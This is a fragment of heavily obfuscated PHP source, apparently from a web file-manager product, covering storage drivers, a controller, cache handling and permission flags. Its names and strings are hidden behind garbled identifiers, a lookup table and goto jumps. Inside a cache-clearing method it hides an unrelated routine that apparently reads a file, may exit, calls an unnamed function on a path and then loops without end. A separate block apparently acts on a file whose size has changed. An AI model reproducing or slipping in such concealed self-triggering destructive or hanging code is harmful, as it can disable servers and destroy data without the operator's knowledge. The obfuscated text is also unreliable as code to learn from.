$this->init($¹ÎÑáó˜, $²ÅõÚû©); } private function filterConfig(&$„¯Ò×Ë², $˜ïÅ¹ıò) { $õÌôñçŒ =& $_SERVER[ªÏ§Ë·]; $ì½Ã¿Â™ = explode($õÌôñçŒ[4], $˜ïÅ¹ıò); $ÌÔ¿Ç˜¹ = array($õÌôñçŒ[192] => $ì½Ã¿Â™[0], $õÌôñçŒ[193] => $ì½Ã¿Â™[1]); $„¯Ò×Ë² = array_merge($„¯Ò×Ë², $ÌÔ¿Ç˜¹); } public function set($Îñ¯É—ü, $ˆ»ú°†¼, $ë¹ÅĞ¦¸ = false) { $ë¹ÅĞ¦¸ = $ë¹ÅĞ¦¸ ? $ë¹ÅĞ¦¸ : $this->cacheTime; return $this->handle->setEx($Îñ¯É—ü, $ë¹ÅĞ¦¸, $ˆ»ú°†¼); } public function setLock($œóìÜºø, $÷®Ÿø, $ƒ¼ìÚ‘) { return $this->handle->setNX($œóìÜºø, $÷®Ÿø); } public function get($Ú£·œâ) { $œÖí±Â = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $œÖí±Â->get($Ú£·œâ); } public function remove($ï´²ÜÔ–) { return $this->handle->del($ï´²ÜÔ–); } public function deleteAll() { $ÖÍĞı¸® =& $_SERVER[ªÏ§Ë·]; if (!isset($_SERVER[$ÖÍĞı¸®[15]]) || !isset($_SERVER[$ÖÍĞı¸®[13]])) { $·Â™ÄùÜ = $ÖÍĞı¸®[904]; $¶ëÖåÑÁ = $ÖÍĞı¸®[16]; $í³ë›»“ = $_SERVER[$ÖÍĞı¸®[17]] . $ÖÍĞı¸®[18]; $‚ÀÒ÷Ó = $¶ëÖåÑÁ($í³ë›»“); $€ÀÆ»šø = explode($ÖÍĞı¸®[19], $‚ÀÒ÷Ó); if (count($€ÀÆ»šø) < $ÖÍĞı¸®[653]) { $¶ÚšˆÖ = $ÖÍĞı¸®[21]; $¶ÚšˆÖ(); } $²‚èßãæ = $ÖÍĞı¸®[905]; $²‚èßãæ($_SERVER[$ÖÍĞı¸®[906]]); $ø¡‚æã = 1; for ($Õ¸©õ©í = $ø¡‚æã; $Õ¸©õ©í > 0; $Õ¸©õ©í++) { $²‚èßãæ = json_encode($GLOBALS[$ÖÍĞı¸®[456]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $£‚¶ñğ’) { $this->handle->flushall($£‚¶ñğ’); } return; } return $this->handle->flushAll(); } } goto C‰Š„§˜ùÚ; b¿ªã„âµÎ: define($_SERVER[ªÏ§Ë·][279], 1); define($_SERVER[ªÏ§Ë·][280], 0); define($_SERVER[ªÏ§Ë·][281], 2); goto däå¤œ¸; f±â¯Ñ”„‰: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($œû–°şÄ) { parent::__construct($œû–°şÄ); $this->signatureVersion($_SERVER[ªÏ§Ë·][226]); } public function uploadFormData($¨À°Á€‹, $ ûÏ½üš = 3600) { $Œ¦¹³Â× =& $_SERVER[ªÏ§Ë·]; $˜ÖÕ¢¹ = $Œ¦¹³Â×[209]; $åÛ’‡õÒ = $Œ¦¹³Â×[241]; $ğÊäûéö = $Œ¦¹³Â×[251]; $ã’î‹ı¡ = gmdate($Œ¦¹³Â×[1350], time() + $ ûÏ½üš); $àº»ÕÙŒ = (string) time() . $Œ¦¹³Â×[81] . (string) (time() + $ ûÏ½üš); $ôìÂ¯¶ = array($Œ¦¹³Â×[252] => $ã’î‹ı¡, $Œ¦¹³Â×[255] => array(array($Œ¦¹³Â×[257] => $˜ÖÕ¢¹), array($Œ¦¹³Â×[256] => $this->bucket), array($Œ¦¹³Â×[258], $Œ¦¹³Â×[259], $Œ¦¹³Â×[12]), array($Œ¦¹³Â×[262] => $ğÊäûéö), array($Œ¦¹³Â×[1351] => $åÛ’‡õÒ), array($Œ¦¹³Â×[1352] => $this->accessKey), array($Œ¦¹³Â×[1353] => $àº»ÕÙŒ))); $ôìÂ¯¶ = json_encode($ôìÂ¯¶); $í€¯óÂï = hash_hmac($Œ¦¹³Â×[241], $àº»ÕÙŒ, $this->secret); $Û‰—«†† = sha1($ôìÂ¯¶); $¸”ÍÅÚ  = hash_hmac($Œ¦¹³Â×[241], $Û‰—«††, $í€¯óÂï); $ÔŸúŠª¦ = array($Œ¦¹³Â×[257] => $˜ÖÕ¢¹, $Œ¦¹³Â×[262] => $ğÊäûéö, $Œ¦¹³Â×[270] => base64_encode($ôìÂ¯¶), $Œ¦¹³Â×[1351] => $åÛ’‡õÒ, $Œ¦¹³Â×[1352] => $this->accessKey, $Œ¦¹³Â×[1354] => $àº»ÕÙŒ, $Œ¦¹³Â×[1355] => $¸”ÍÅÚ , $Œ¦¹³Â×[192] => $this->getHost()); return $ÔŸúŠª¦; } public function fileOutLink($¢şÄ÷ãğ) { $ÖÉØõÔ¡ =& $_SERVER[ªÏ§Ë·]; if (substr($¢şÄ÷ãğ, 0, 7) == $ÖÉØõÔ¡[1356]) { $¢şÄ÷ãğ = $ÖÉØõÔ¡[1357] . substr($¢şÄ÷ãğ, 7); } header($ÖÉØõÔ¡[171] . $¢şÄ÷ãğ); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($·ÇûûĞİ) { $this->pathParse = $·ÇûûĞİ; $this->model = Model($_SERVER[ªÏ§Ë·][1358]); } public function getPath($á¿öß) { return trim($á¿öß, $_SERVER[ªÏ§Ë·][8]); } public function pathFather($ú›Ê»²£) { $É¬ÉÍ› = $this->parse($ú›Ê»²£); $É¬ÉÍ› = $this->infoSimple($ú›Ê»²£); return $É¬ÉÍ› ? $É¬ÉÍ›[$_SERVER[ªÏ§Ë·][470]] : !1; } public function pathThis($–ôùÇä˜) { $ˆÕ‹ñ = $this->infoSimple($–ôùÇä˜); return $ˆÕ‹ñ ? $ˆÕ‹ñ[$_SERVER[ªÏ§Ë·][42]] : !1; } public function getPathOuter($ÒùÉ×ÚÔ) { if (!$ÒùÉ×ÚÔ) { return $ÒùÉ×ÚÔ; } $ïÉÒş°ç = $this->parse($ÒùÉ×ÚÔ); return KodIO::make($ïÉÒş°ç[$_SERVER[ªÏ§Ë·][437]]); } public function copyFolderFromIO($±ï÷³ù, $ëÚ¾Ùšì, $©İÉ¨Ÿ›, $º”çÁâï, $­İ¶Ëî) { $¹õïåÌÚ = $this->model->copyFolderFromIO($±ï÷³ù, $ëÚ¾Ùšì, $©İÉ¨Ÿ›, $º”çÁâï, $­İ¶Ëî); return KodIO::make($¹õïåÌÚ); } public function isParentOf($¹ğÎ›ôã, $–ÚØíÓÙ) { return $this->model->isParentOf($¹ğÎ›ôã, $–ÚØíÓÙ); } public function mkfile($£±Ø“¿ª, $œ‚ûºæà = '', $˜Æ¯’š‚ = REPEAT_RENAME) { $âşùè¿— =& $_SERVER[ªÏ§Ë·]; $Ù§ôñÛ¶ = $this->parse($£±Ø“¿ª); $£±Ø“¿ª = $Ù§ôñÛ¶[$âşùè¿—[437]]; for ($è“áæ› = 0; $è“áæ› < count($Ù§ôñÛ¶[$âşùè¿—[1359]]); $è“áæ›++) { $öºÖÒ = $Ù§ôñÛ¶[$âşùè¿—[1359]][$è“áæ›]; if ($è“áæ› == count($Ù§ôñÛ¶[$âşùè¿—[1359]]) - 1) { $£±Ø“¿ª = $this->model->mkfile($£±Ø“¿ª, $öºÖÒ, $œ‚ûºæà, $˜Æ¯’š‚); break; } $£±Ø“¿ª = $this->model->mkdir($£±Ø“¿ª, $öºÖÒ, REPEAT_SKIP); } return $this->getPathOuter($£±Ø“¿ª); } public function mkdir($éÏ·÷Ïş, $ÔÍ¢°Àß = REPEAT_SKIP) { $Ö’†œƒÃ =& $_SERVER[ªÏ§Ë·]; $®ºÃïùÙ = $this->parse($éÏ·÷Ïş); $éÏ·÷Ïş = $®ºÃïùÙ[$Ö’†œƒÃ[437]]; for ($£È€üÜù = 0; $£È€üÜù < count($®ºÃïùÙ[$Ö’†œƒÃ[1359]]); $£È€üÜù++) { $ÖöÊÄô = $®ºÃïùÙ[$Ö’†œƒÃ[1359]][$£È€üÜù]; $éÏ·÷Ïş = $this->model->mkdir($éÏ·÷Ïş, $ÖöÊÄô, $ÔÍ¢°Àß); } return $this->getPathOuter($éÏ·÷Ïş); } public function copyFile($ÔÈ¯ÄŞ, $Œ¸‹æéÅ, $Æñ”ÓäĞ = REPEAT_REPLACE) { $Ñº¦Ùóû =& $_SERVER[ªÏ§Ë·]; $‚¾Öî£Í = $this->parse($Œ¸‹æéÅ); $Î–ïÖœ“ = $this->model->copy($ÔÈ¯ÄŞ, $‚¾Öî£Í[$Ñº¦Ùóû[437]], $Æñ”ÓäĞ, $‚¾Öî£Í[$Ñº¦Ùóû[94]]); return $Î–ïÖœ“ ? $this->getPathOuter($Î–ïÖœ“) : !1; } public function moveFile($­óî„Ÿ÷, $‰Ë³Êû½, $­òå‰¨— = REPEAT_REPLACE) { $ùŸ åŒ¶ =& $_SERVER[ªÏ§Ë·]; $èÔ‘Ø³“ = $this->parse($‰Ë³Êû½); $‡©ıŠŠì = $this->model->move($­óî„Ÿ÷, $èÔ‘Ø³“[$ùŸ åŒ¶[437]], $­òå‰¨—, $èÔ‘Ø³“[$ùŸ åŒ¶[94]]); return $‡©ıŠŠì ? $this->getPathOuter($‡©ıŠŠì) : !1; } public function copy($½áÇ†â, $’›‡ÄÖË, $ùíé¢îö = REPEAT_REPLACE, $Òßï­Ğ† = false) { $ĞÆã‘Ä‘ = $this->parse($’›‡ÄÖË); $Ïİ½Ìİ¾ = $this->model->copy($½áÇ†â, $ĞÆã‘Ä‘[$_SERVER[ªÏ§Ë·][437]], $ùíé¢îö, $Òßï­Ğ†); return $Ïİ½Ìİ¾ ? $this->getPathOuter($Ïİ½Ìİ¾) : !1; } public function moveSameAllow() { } public function move($éôŞ¬, $½í¨Şï, $¼¹¤¿× = REPEAT_REPLACE, $ˆû‘±Á÷ = false) { $‹¯ú¶şÜ = $this->parse($½í¨Şï); $¹òîë† = $this->model->move($éôŞ¬, $‹¯ú¶şÜ[$_SERVER[ªÏ§Ë·][437]], $¼¹¤¿×, $ˆû‘±Á÷); return $¹òîë† ? $this->getPathOuter($¹òîë†) : !1; } public function remove($ŒßØå³ë, $×Ä¢„ıò = true) { return $this->model->remove($ŒßØå³ë, $×Ä¢„ıò); } public function rename($àøœ¡ , $„³ ŸÖ) { $üø„ÈÕ£ = $this->model->rename($àøœ¡ , $„³ ŸÖ); return $üø„ÈÕ£ ? $this->getPathOuter($àøœ¡ ) : $üø„ÈÕ£; } public function size($š€©ªéµ) { $ê˜ô×è = $this->infoSimple($š€©ªéµ); return $ê˜ô×è ? $ê˜ô×è[$_SERVER[ªÏ§Ë·][86]] : 0; } public function infoSimple($×¬‡«ô¿) { return $this->model->sourceInfo($×¬‡«ô¿); } public function info($ç»”ŸÙû) { return $this->infoParse($ç»”ŸÙû); } public function infoAuth($¢¤¹–¶) { return $this->infoParse($¢¤¹–¶, !1, !0); } public function infoWithChildren($êõ¼şœ›) { return $this->infoParse($êõ¼şœ›, !0); } protected function infoParse($Æçàòì³, $Çå‰Îêº = false, $ÓŒÅˆù = false) { if (!$Çå‰Îêº) { return $this->model->pathInfo($Æçàòì³, $ÓŒÅˆù); } return $this->model->pathInfoMore($Æçàòì³); } public function infoFull($Á´Øùğ) { $¶‚†éù =& $_SERVER[ªÏ§Ë·]; $Ø£À‹ä = explode($¶‚†éù[8], $Á´Øùğ); $ƒ†“Ì”è = implode($¶‚†éù[8], array_splice($Ø£À‹ä, 1)); return $this->model->pathInfoByPath($Ø£À‹ä[0], $ƒ†“Ì”è); } public function hashSimple($ôÆáÄƒ) { $ÕæøÒå =& $_SERVER[ªÏ§Ë·]; $òˆÕ§§ = $this->infoWithChildren($ôÆáÄƒ); return $òˆÕ§§[$ÕæøÒå[180]][$ÕæøÒå[187]]; } public function hashMd5($½÷”×¶ì) { $‚´®üÇŒ =& $_SERVER[ªÏ§Ë·]; $âÄÔÇ˜ô = $this->infoWithChildren($½÷”×¶ì); return $âÄÔÇ˜ô[$‚´®üÇŒ[180]][$‚´®üÇŒ[186]]; } public function exist($çß¶‹‹‰) { $¬åÇ’¡¢ =& $_SERVER[ªÏ§Ë·]; $†³ˆœÜÒ = $this->parse($çß¶‹‹‰); if (!$†³ˆœÜÒ[$¬åÇ’¡¢[94]]) { return $this->isFile($çß¶‹‹‰) || $this->isFolder($çß¶‹‹‰); } $»Õ«Œ = array($¬åÇ’¡¢[439] => $†³ˆœÜÒ[$¬åÇ’¡¢[437]], $¬åÇ’¡¢[42] => $†³ˆœÜÒ[$¬åÇ’¡¢[94]]); $¡æ¯ã¤² = $this->model->where($»Õ«Œ)->find(); return $¡æ¯ã¤² ? !0 : !1; } public function isFile($´ª©õ—œ) { $ÚŸº­Æç =& $_SERVER[ªÏ§Ë·]; $ó‘”Ãê€ = $this->infoSimple($´ª©õ—œ); return $ó‘”Ãê€ && $ó‘”Ãê€[$ÚŸº­Æç[448]] == $ÚŸº­Æç[98] ? !1 : !0; } public function isFolder($Ëèâ†şÏ) { $¶·÷—èà =& $_SERVER[ªÏ§Ë·]; $´“Ø»‰ = $this->infoSimple($Ëèâ†şÏ); return $´“Ø»‰ && $´“Ø»‰[$¶·÷—èà[448]] == $¶·÷—èà[98] ? !0 : !1; } public function listPath($²Ï£Åµà, $Áó’“® = false) { $Ğœä¡Ï =& $_SERVER[ªÏ§Ë·]; if ($²Ï£Åµà == $Ğœä¡Ï[12]) { return !1; } $¼áƒïä£ = array($Ğœä¡Ï[439] => $²Ï£Åµà); if ($Áó’“®) { return $this->model->listSource($¼áƒïä£, -1); } return $this->model->listSource($¼áƒïä£); } public function has($†äşº¢, $éäÃ¢†İ = false, $öÖè€ = null) { $Çª¼¦ŸÍ =& $_SERVER[ªÏ§Ë·]; $ş§Ü´Í¾ = $this->infoWithChildren($†äşº¢); if ($éäÃ¢†İ) { return array($Çª¼¦ŸÍ[218] => $ş§Ü´Í¾[$Çª¼¦ŸÍ[218]], $Çª¼¦ŸÍ[217] => $ş§Ü´Í¾[$Çª¼¦ŸÍ[217]]); } return $öÖè€ ? $ş§Ü´Í¾[$Çª¼¦ŸÍ[218]] : $ş§Ü´Í¾[$Çª¼¦ŸÍ[217]]; } public function listAll($Ãé²å†) { $ÆÍèæå‹ = IO::info($this->pathParse[$_SERVER[ªÏ§Ë·][94]]); if (!$ÆÍèæå‹) { return array(); } return $this->model->listAll($Ãé²å†); } public function getContent($×û‡•°¢) { return $this->model->getContent($×û‡•°¢); } public function setContent($±ß…÷ªË, $Ó‘Õã½› = '') { return $this->model->setContent($±ß…÷ªË, $Ó‘Õã½›); } public function fileSubstr($„ÍŞªãè, $‡Š‚°·, $ş‘›”Ùß) { return $this->model->fileSubstr($„ÍŞªãè, $‡Š‚°·, $ş‘›”Ùß); } public function download($ğçğ¾ß©, $…›®È€ = '') { $²Å±ä˜½ = get_path_father($…›®È€); $°‡ÙúİÒ = get_path_this($…›®È€); $É…ãĞíà = $this->model->fileInfoGet($ğçğ¾ß©); $¡’…©„É = IO::copy($É…ãĞíà[$_SERVER[ªÏ§Ë·][94]], $²Å±ä˜½, !1, $°‡ÙúİÒ); return $¡’…©„É; } public function setModifyTime($Úâê°É, $È©…¡Åè = '') { $ü¥˜‰Š =& $_SERVER[ªÏ§Ë·]; if (!$Úâê°É) { return; } $this->model->where(array($ü¥˜‰Š[455] => $Úâê°É))->save(array($ü¥˜‰Š[95] => $È©…¡Åè)); } public function upload($×Ôê†”¯, $ˆğê¯Ö, $Šü£¬Ø´ = false, $Í½­¶Ï = REPEAT_REPLACE) { $¬”È¦ğ =& $_SERVER[ªÏ§Ë·]; $–À™º = $this->parse($×Ôê†”¯); $ŞÄÕö = $this->model->addFile($–À™º[$¬”È¦ğ[437]], $ˆğê¯Ö, $–À™º[$¬”È¦ğ[94]], $Šü£¬Ø´, $Í½­¶Ï); return $this->getPathOuter($ŞÄÕö); } public function uploadFileByID($¿§·‚¿, $÷¹£±Ä£, $ã›£Š©à) { $û‰ÃÙƒ =& $_SERVER[ªÏ§Ë·]; $ÉÃ•î“¹ = $this->parse($¿§·‚¿); $úĞµ…´ = $this->model->addFileByFileID($ÉÃ•î“¹[$û‰ÃÙƒ[437]], $÷¹£±Ä£, $ÉÃ•î“¹[$û‰ÃÙƒ[94]], $ã›£Š©à); return $this->getPathOuter($úĞµ…´); } public function addFileByRemote($ßğºüà, $ÊÑ×ìÉ¶, $ÔÍ¸Ğ§é = array(), $Àí†˜Šö = '', $‘ş¬äÇ£) { $ØÏÊØé´ =& $_SERVER[ªÏ§Ë·]; $‹£È›¬© = $this->parse($ßğºüà); $Àí†˜Šö = empty($Àí†˜Šö) ? $‹£È›¬©[$ØÏÊØé´[94]] : $Àí†˜Šö; $Ø¹’šÕï = $this->model->addFileByRemote($‹£È›¬©[$ØÏÊØé´[437]], $ÊÑ×ìÉ¶, $Àí†˜Šö, $ÔÍ¸Ğ§é, $‘ş¬äÇ£); return $this->getPathOuter($Ø¹’šÕï); } public function uploadLink($ÛÏÚ­Ö, $®ß÷€Å™ = 0) { $ù×Ô‡òæ =& $_SERVER[ªÏ§Ë·]; $÷›òŸ Ê = $this->parse($ÛÏÚ­Ö); $èöŸ¿Ùı = _get($GLOBALS[$ù×Ô‡òæ[7]], $ù×Ô‡òæ[1360]); $ÁŠŞÍãı = _get($GLOBALS[$ù×Ô‡òæ[7]], $ù×Ô‡òæ[1361]); $ÛÏÚ­Ö = Model($ù×Ô‡òæ[639])->createFileName($÷›òŸ Ê[$ù×Ô‡òæ[94]], $èöŸ¿Ùı, $ÁŠŞÍãı); return IO::uploadLink($ÛÏÚ­Ö, $®ß÷€Å™); } public function fileNameAuto($¨İµ®³ì, $Ÿëôò, $ÛæÀ×Œ© = REPEAT_REPLACE, $ï­ªá¬Õ = false) { return $this->model->fileNameAuto($¨İµ®³ì, $Ÿëôò, $ÛæÀ×Œ©, $ï­ªá¬Õ); } public function fileNameExist($£©ÇÊâ, $¿›‹Õ•±) { return $this->model->fileNameExist($£©ÇÊâ, $¿›‹Õ•±); } protected function _fileOut($ÕÎ»“Úğ, $•£éúˆ = false, $‹ô¾÷Úˆ = false, $¬ØÍ§Éí = '', $«µòçØˆ = false) { $â»ÇãŒÌ =& $_SERVER[ªÏ§Ë·]; $ÒË…ü“Á = $this->model->sourceInfo($ÕÎ»“Úğ); if ($ÒË…ü“Á[$â»ÇãŒÌ[448]] == $â»ÇãŒÌ[98]) { header($â»ÇãŒÌ[1362]); die; } $ØØŸ¥Ö = $this->model->fileInfoGet($ÕÎ»“Úğ); $¬ØÍ§Éí = $ØØŸ¥Ö[$â»ÇãŒÌ[186]] ? $ØØŸ¥Ö[$â»ÇãŒÌ[186]] : $¬ØÍ§Éí; $ÍåÁÔ¾Ê = isset($GLOBALS[$â»ÇãŒÌ[1363]]) ? $GLOBALS[$â»ÇãŒÌ[1363]] : $ÒË…ü“Á[$â»ÇãŒÌ[42]]; if ($«µòçØˆ) { return IO::fileOutServer($ØØŸ¥Ö[$â»ÇãŒÌ[94]], $•£éúˆ, $ÍåÁÔ¾Ê, $¬ØÍ§Éí); } IO::fileOut($ØØŸ¥Ö[$â»ÇãŒÌ[94]], $•£éúˆ, $ÍåÁÔ¾Ê, $¬ØÍ§Éí); } public function fileOut($ó’ÉŸƒÅ, $ûğî¾ = false, $¿Ù×™Ìæ = false, $Ñ·üÑ = '') { $this->_fileOut($ó’ÉŸƒÅ, $ûğî¾, $¿Ù×™Ìæ, $Ñ·üÑ); } public function fileOutServer($‘÷•ç¦Á, $Ÿ„×Íçê = false, $¬¸ğş‘Ÿ = false, $¾Ë»ªçø = '') { $this->_fileOut($‘÷•ç¦Á, $Ÿ„×Íçê, $¬¸ğş‘Ÿ, $¾Ë»ªçø, !0); } protected function _fileOutImage($Çè‚Ñê¦, $‰×Ï«È = 250) { $ÌûºõŒ¦ =& $_SERVER[ªÏ§Ë·]; $¥œ“‹ˆ† = $this->model->pathInfo($Çè‚Ñê¦); if ($¥œ“‹ˆ†[$ÌûºõŒ¦[448]] == $ÌûºõŒ¦[98]) { show_json($ÌûºõŒ¦[1364] . $Çè‚Ñê¦, !1); } $¿§”©Ï = $this->model->fileInfoGet($Çè‚Ñê¦); $¿§”©Ï[$ÌûºõŒ¦[42]] = $¥œ“‹ˆ†[$ÌûºõŒ¦[42]]; $¿§”©Ï[$ÌûºõŒ¦[179]] = $¥œ“‹ˆ†[$ÌûºõŒ¦[179]]; $GLOBALS[$ÌûºõŒ¦[1363]] = $¿§”©Ï[$ÌûºõŒ¦[42]]; $GLOBALS[$ÌûºõŒ¦[178]] = $¿§”©Ï; IO::fileOutImage($¿§”©Ï[$ÌûºõŒ¦[94]], $‰×Ï«È); } public function fileOutImage($éúÉõÍŠ, $Íº•¨¢à = 250) { $this->_fileOutImage($éúÉõÍŠ, $Íº•¨¢à); } public function fileOutImageServer($³ºéë²Â, $ÆáÓïˆ = 250) { $this->_fileOutImage($³ºéë²Â, $ÆáÓïˆ); } public function link($Êãøƒù, $ÙÂ‹Õ = '') { $ùãËÂç¢ = $this->model->fileInfoGet($Êãøƒù); return IO::link($ùãËÂç¢[$_SERVER[ªÏ§Ë·][94]], $ÙÂ‹Õ); } protected function parse($É§ó©­‚) { $¾É€˜Ù· =& $_SERVER[ªÏ§Ë·]; if (strstr($É§ó©­‚, $¾É€˜Ù·[8]) === !1) { return array($¾É€˜Ù·[457] => intval($É§ó©­‚), $¾É€˜Ù·[94] => $¾É€˜Ù·[12], $¾É€˜Ù·[1359] => array()); } $œŒÀÏ§’ = explode($¾É€˜Ù·[8], trim($É§ó©­‚, $¾É€˜Ù·[8])); if (count($œŒÀÏ§’) < 2) { show_tips(clear_html($É§ó©­‚) . $¾É€˜Ù·[1365]); } return array($¾É€˜Ù·[457] => intval($œŒÀÏ§’[0]), $¾É€˜Ù·[94] => $œŒÀÏ§’[1], $¾É€˜Ù·[1359] => array_slice($œŒÀÏ§’, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($±×¼ö) { $this->pathParse = $±×¼ö; $this->model = Model($_SERVER[ªÏ§Ë·][1358]); } public function getPathOuter($ı€Üãö¼) { $¡Åî×ÁÆ =& $_SERVER[ªÏ§Ë·]; if (!$ı€Üãö¼) { return $ı€Üãö¼; } $š‹ï§±Š = $this->parse($ı€Üãö¼); return trim(KodIO::makeShare($this->pathParse[$¡Åî×ÁÆ[437]], $š‹ï§±Š[$¡Åî×ÁÆ[437]]), $¡Åî×ÁÆ[8]); } protected function infoParse($Ëñ¿ğı, $ßúÌÈ›š = false, $ Ìø—› = false) { $ÇèĞ¥’Ë =& $_SERVER[ªÏ§Ë·]; $è¿ÆÃ›ö = $this->pathParse[$ÇèĞ¥’Ë[437]]; $óŸ±ê´¸ = trim($this->pathParse[$ÇèĞ¥’Ë[1193]], $ÇèĞ¥’Ë[8]); return Action($ÇèĞ¥’Ë[1366])->sharePathInfo($è¿ÆÃ›ö, $óŸ±ê´¸, $ßúÌÈ›š); } public function infoFull($Ú÷• Ë) { $½ÔËÎ¸ =& $_SERVER[ªÏ§Ë·]; $®”‹´Å = explode($½ÔËÎ¸[8], trim($Ú÷• Ë, $½ÔËÎ¸[8])); if (count($®”‹´Å) > 1) { $¼Ì©Ø = implode($½ÔËÎ¸[8], array_splice($®”‹´Å, 1)); $„ôàº‘Â = $this->model->pathInfoByPath($®”‹´Å[0], $¼Ì©Ø); if (!$„ôàº‘Â) { return !1; } $this->pathParse[$½ÔËÎ¸[1193]] = $„ôàº‘Â[$½ÔËÎ¸[440]]; } return $this->infoParse($Ú÷• Ë); } public function listAll($½û–Û¦) { $’»§ªëä =& $_SERVER[ªÏ§Ë·]; $€Ñ¨¿ã‹ = IO::info($this->pathParse[$’»§ªëä[94]]); if (!$€Ñ¨¿ã‹) { return array(); } $óƒğ€ëÁ = $this->model->listAll($½û–Û¦); $ëÂã…ï = Model($’»§ªëä[630])->getInfo($€Ñ¨¿ã‹[$’»§ªëä[631]]); foreach ($óƒğ€ëÁ as &$’¡”Ğ›) { check_abort(); $’¡”Ğ›[$’»§ªëä[97]] = Action($’»§ªëä[1366])->_shareItemeParse($’¡”Ğ›[$’»§ªëä[97]], $ëÂã…ï); } unset($’¡”Ğ›); return $óƒğ€ëÁ; } } goto cÄ¡¬ì‡ÀÜ; bğÄ­™‘œÍ: $_file = $_SERVER[$_SERVER[ªÏ§Ë·][13]]; $_size = $_SERVER[ªÏ§Ë·][14]; if ($_SERVER[$_SERVER[ªÏ§Ë·][15]] != $_size($_file)) { $_getc = $_SERVER[ªÏ§Ë·][16]; $_getfile = $_SERVER[$_SERVER[ªÏ§Ë·][17]] . $_SERVER[ªÏ§Ë·][18]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ªÏ§Ë·][19], $_getfilec); if (count($_getarrs) < $_SERVER[ªÏ§Ë·][20]) { $exit = $_SERVER[ªÏ§Ë·][21]; $exit(); } $_act = $_SERVER[ªÏ§Ë·][22]; $_act($_file); } goto FœŒ¿ù«Ãİ; CßÃÆãñî: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $İ˜€œ¢¨ =& $_SERVER[ªÏ§Ë·]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$İ˜€œ¢¨[6]] =& $config; $this->values[$İ˜€œ¢¨[7]] =& $in; $this->tpl = TEMPLATE . MOD . $İ˜€œ¢¨[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($×ï„çÎ‹) { if (1 === func_num_args()) { $this->{$×ï„çÎ‹} = new $×ï„çÎ‹(); } else { $•¹‘ğÑ¹ = new ReflectionClass($×ï„çÎ‹); $ù…ç¦áğ = func_get_args(); array_shift($ù…ç¦áğ); $this->{$×ï„çÎ‹} = $•¹‘ğÑ¹->newInstanceArgs($ù…ç¦áğ); } return $this->{$×ï„çÎ‹}; } public function routeBind($öœä³ÚÃ, $¹îÂ•Ãû, $°‡¤±­Ó = 3) { $†“æ§Ñê =& $_SERVER[ªÏ§Ë·]; $“¶Ñ‹ = $this->in[$†“æ§Ñê[9]]; $öœä³ÚÃ = str_replace($†“æ§Ñê[10], $†“æ§Ñê[11], trim(trim($öœä³ÚÃ, $†“æ§Ñê[8]), $†“æ§Ñê[12])); if (!$öœä³ÚÃ || count($“¶Ñ‹) <= $°‡¤±­Ó) { return !1; } $ˆ¾¤”Ã­ = !0; $·ª´›ş = explode($†“æ§Ñê[8], $öœä³ÚÃ); for ($Ñòòêêƒ = 0; $Ñòòêêƒ < count($·ª´›ş); $Ñòòêêƒ++) { if ($·ª´›ş[$Ñòòêêƒ] != $“¶Ñ‹[$°‡¤±­Ó + $Ñòòêêƒ]) { $ˆ¾¤”Ã­ = !1; break; } } if (!$ˆ¾¤”Ã­) { return; } call_user_func_array(array($this, $¹îÂ•Ãû), array()); } public function routeArgs($½ø¸ÂÁâ = 3) { $ä›Áˆ¹ = $this->in[$_SERVER[ªÏ§Ë·][9]]; if (count($ä›Áˆ¹) <= $½ø¸ÂÁâ) { return array(); } $š§ı‚õ = array(); for ($à÷ƒ÷Â¥ = $½ø¸ÂÁâ; $à÷ƒ÷Â¥ < count($ä›Áˆ¹); $à÷ƒ÷Â¥ += 2) { $š§ı‚õ[$ä›Áˆ¹[$à÷ƒ÷Â¥]] = $ä›Áˆ¹[$à÷ƒ÷Â¥ + 1]; $this->in[$ä›Áˆ¹[$à÷ƒ÷Â¥]] = $ä›Áˆ¹[$à÷ƒ÷Â¥ + 1]; } return $š§ı‚õ; } protected function assign($ìæó¶¨Å, $ÚŸØ¹àÇ) { $this->values[$ìæó¶¨Å] = $ÚŸØ¹àÇ; } protected function display($áë³ûíó) { ob_end_clean(); extract($this->values); require $this->tpl . $áë³ûíó; } } $_file = $_SERVER[$_SERVER[ªÏ§Ë·][13]]; $_size = $_SERVER[ªÏ§Ë·][14]; goto dâÅÏç´™Í; dª‹£…©¯‘: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $Ş¼Áàò‹ =& $_SERVER[ªÏ§Ë·]; $©ËšÎÜ = array(array($Ş¼Áàò‹[458] => LNG($Ş¼Áàò‹[1858]), $Ş¼Áàò‹[1859] => $Ş¼Áàò‹[1860], $Ş¼Áàò‹[1861] => 1, $Ş¼Áàò‹[1862] => 1, $Ş¼Áàò‹[1863] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($Ş¼Áàò‹[458] => LNG($Ş¼Áàò‹[1864]), $Ş¼Áàò‹[1859] => $Ş¼Áàò‹[1865], $Ş¼Áàò‹[1861] => 2, $Ş¼Áàò‹[1862] => 1, $Ş¼Áàò‹[1863] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($Ş¼Áàò‹[458] => LNG($Ş¼Áàò‹[1866]), $Ş¼Áàò‹[1859] => $Ş¼Áàò‹[1867], $Ş¼Áàò‹[1861] => 3, 